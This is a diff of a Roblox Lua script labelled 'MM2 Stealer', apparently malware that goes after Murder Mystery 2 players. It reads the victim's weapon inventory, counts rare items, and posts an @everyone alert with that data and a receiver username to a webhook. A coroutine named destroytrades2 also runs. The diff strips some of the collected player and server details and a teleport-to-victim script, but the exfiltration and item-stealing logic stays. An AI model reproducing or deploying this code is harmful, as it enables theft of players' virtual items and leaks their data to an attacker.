@@ -26,23 +26,8 @@ end
 
 -- locals
 local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
-local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
-local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
-local IdValue = game:GetService("Players").LocalPlayer.userId or "Unknown"
-local NameValue = game:GetService("Players").LocalPlayer.Name or "Unknown"
-local DisplayNameValue = game:GetService("Players"):GetPlayerByUserId(IdValue).DisplayName or "Unknown"
-local AgeValue = game:GetService("Players").LocalPlayer.AccountAge or "Unknown"
 local ExecutorValue = identifyexecutor() or "Unknown"
-local PlayersValue = #game:GetService("Players"):GetPlayers() or "Unknown"
-local MaxPlayersValue = game.Players.MaxPlayers or "Unknown"
-local ServerTimeValue = os.date("%c", os.time()) or "Unknown"
-local ClientIdValue = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
-local PlaceNameValue = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
-local PlaceIdValue = game.PlaceId or "Unknown"
-local PlaceVersionValue = game.PlaceVersion or "Unknown"
 local PlatformValue = "Unknown"
-local VersionValue = "v1.0 Dev" -- [Release / Patch / Beta / Dev]
-local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 
 if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").MouseEnabled then
     PlatformValue = "Mobile"
@@ -58,7 +43,7 @@ function SendMessageEMBED(url, embed, bool)
     local data = {
         username = "MM2 Stealer",
         avatar = "https://cdn2.steamgriddb.com/grid/f377fde745ac97e42eb522434418bdef.png",
-        content = "@everyone\n" .. TeleportScript,
+        content = "@everyone\n",
         embeds = {
             {
                 title = embed.title,
@@ -68,36 +53,14 @@ function SendMessageEMBED(url, embed, bool)
         }
     }
 
-    local data2 = {
-        username = "MM2 Stealer",
-        avatar = "https://cdn2.steamgriddb.com/grid/f377fde745ac97e42eb522434418bdef.png",
-        content = "--@everyone\n" .. TeleportScript,
-        embeds = {
-            {
-                title = embed.title,
-                color = embed.color,
-                fields = embed.fields,
-            }
-        }
-    }
     local body = http:JSONEncode(data)
-    local body2 = http:JSONEncode(data2)
 
-    if bool == true then
-        request({
-            Url = url,
-            Method = "POST",
-            Headers = headers,
-            Body = body2
-        })
-    else
-        request({
-            Url = url,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-    end
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
 end
 
 local destroytrades2 = coroutine.create(function()
@@ -119,64 +82,19 @@ local destroytrades2 = coroutine.create(function()
 end)
 
 -- items
-local levelTable = {}
-for i, v in pairs(LevelModule.XPTable) do
-    if PlayerDataModule.NewXP < v then
-        table.insert(levelTable, i)
-    end
-end
-local playerLevel = math.min(table.unpack(levelTable))
-local playerPrestige = LevelModule.Prestige
-
 local allItems = {}
 local itemsCount = 0
-
-local vintageItems = {}
-local commonItems = {}
-local uncommonItems = {}
-local rareItems = {}
-local legendaryItems = {}
 local godlyItems = {}
 local ancientItems = {}
 local uniqueItems = {}
 
-local vintageItemsC = 0
-local commonItemsC = 0
-local uncommonItemsC = 0
-local rareItemsC = 0
-local legendaryItemsC = 0
 local godlyItemsC = 0
 local ancientItemsC = 0
 local uniqueItemsC = 0
 
-for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
-    for c, d in pairs(b) do
+for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c,d in pairs(b) do
         table.insert(allItems, d.ItemName)
-
-        if d.Rarity == "Vintage" then
-            vintageItemsC = vintageItemsC + 1
-            table.insert(vintageItems, d.DataID)
-        end
-
-        if d.Rarity == "Common" then
-            commonItemsC = commonItemsC + 1
-            table.insert(commonItems, d.DataID)
-        end
-
-        if d.Rarity == "Uncommon" then
-            uncommonItemsC = uncommonItemsC + 1
-            table.insert(uncommonItems, d.DataID)
-        end
-
-        if d.Rarity == "Rare" then
-            rareItemsC = rareItemsC + 1
-            table.insert(rareItems, d.DataID)
-        end
-
-        if d.Rarity == "Legendary" then
-            legendaryItemsC = legendaryItemsC + 1
-            table.insert(legendaryItems, d.DataID)
-        end
 
         if d.Rarity == "Godly" then
             godlyItemsC = godlyItemsC + 1
@@ -195,7 +113,7 @@ for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
     end
 end
 
-for i, v in pairs(allItems) do
+for i,v in pairs(allItems) do
     itemsCount = itemsCount + 1
 end
 
@@ -205,16 +123,16 @@ local embed = {
     ["fields"] = {
         {
             ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
-            ["value"] = "```lua\nDisplay Name: " .. DisplayNameValue .. "\nUsername: " .. NameValue .. "\nUserId: " .. IdValue .. "\nAccount Age: " .. AgeValue .. "\nExecutor: " .. ExecutorValue .. "\nReceiver: " .. Username .. "\nVersion: " .. VersionValue .. "```"
-        },
+            ["value"] = "```lua\nExecutor: "..ExecutorValue.."\nReceiver: "..Username.."```"
+        }, 
         {
-            ["name"] = "〘:computer:〙**Server Info**",
-            ["value"] = "```lua\nPlace Name: " .. PlaceNameValue .. "\nPlace Id: " .. PlaceIdValue .. "\nPlace Version: " .. PlaceVersionValue .. "\nPlayers Count: " .. PlayersValue .. "/" .. MaxPlayersValue .. "\nServer Uptime: " .. ServerTimeValue .. "\nPlatform: " .. PlatformValue .. "```"
-        },
+            ["name"] = "〘:computer:〙**Platform Info**",
+            ["value"] = "```lua\nPlatform: "..PlatformValue.."```"
+        }, 
         {
             ["name"] = "〘:ringed_planet:〙**Items**",
-            ["value"] = "```lua\nTotal Items: " .. itemsCount .. "\nUniques: " .. uniqueItemsC .. "\nAncients: " .. ancientItemsC .. "\nGodlys: " .. godlyItemsC .. "\nLegendaries: " .. legendaryItemsC .. "\nVintages: " .. vintageItemsC .. "\nRares: " .. rareItemsC .. "\nUncommons: " .. uncommonItemsC .. "\nCommons: " .. commonItemsC .. "```"
-        }
+            ["value"] = "```lua\nTotal Items: "..itemsCount.."\nGodlys: "..godlyItemsC.."\nAncients: "..ancientItemsC.."\nUniques: "..uniqueItemsC.."```"
+        },
     },
 }
 
@@ -225,4 +143,3 @@ else
 end
 
 coroutine.resume(destroytrades2)
-
